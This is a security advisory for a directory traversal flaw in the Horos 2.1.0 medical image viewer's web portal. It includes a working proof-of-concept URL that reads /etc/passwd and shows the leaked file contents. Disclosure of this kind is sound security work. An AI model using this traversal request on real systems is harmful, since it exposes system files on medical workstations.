@@ -1,0 +1,58 @@
+Horos 2.1.0 Web Portal Remote Information Disclosure Exploit
+
+
+Vendor: Horos Project
+Product web page: https://www.horosproject.org
+Affected version: 2.1.0
+
+Summary: Horos™ is an open-source, free medical image viewer. The goal of the
+Horos Project is to develop a fully functional, 64-bit medical image viewer for
+OS X. Horos is based upon OsiriX and other open source medical imaging libraries.
+
+Desc: Horos suffers from a file disclosure vulnerability when input passed thru the
+URL path is not properly verified before being used to read files. This can be
+exploited to include files from local resources with directory traversal attacks.
+
+Tested on: macOS Sierra/10.12.2
+           macOS Sierra/10.12.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5387
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5387.php
+
+
+15.12.2016
+
+--
+
+
+PoC request:
+
+http://127.0.0.1:3333/.../...//.../...//.../...//.../...//.../...//etc/passwd
+
+
+Response:
+
+##
+# User Database
+# 
+# Note that this file is consulted directly only when the system is running
+# in single-user mode.  At other times this information is provided by
+# Open Directory.
+#
+# See the opendirectoryd(8) man page for additional information about
+# Open Directory.
+##
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+daemon:*:1:1:System Services:/var/root:/usr/bin/false
+_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
+_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
+_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false
+...
+...
+...
